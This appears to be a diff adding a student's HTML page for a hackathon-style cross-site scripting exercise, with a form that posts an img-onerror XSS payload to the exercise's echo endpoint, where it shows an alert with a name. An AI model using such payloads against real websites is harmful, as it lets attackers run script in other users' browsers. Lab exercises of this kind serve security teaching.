@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Level 2 XSS Attack</title>
+</head>
+<body>
+  <h1>Level 2 XSS Test</h1>
+  <form method="POST" action="https://waph-hackathon.eastus.cloudapp.azure.com/xss/level2/echo.php">
+    <input name="input" value='<img src=x onerror="alert(`Ian Cannon`)">' size="80" />
+    <button type="submit">Submit Attack</button>
+  </form>
+</body>
+</html>
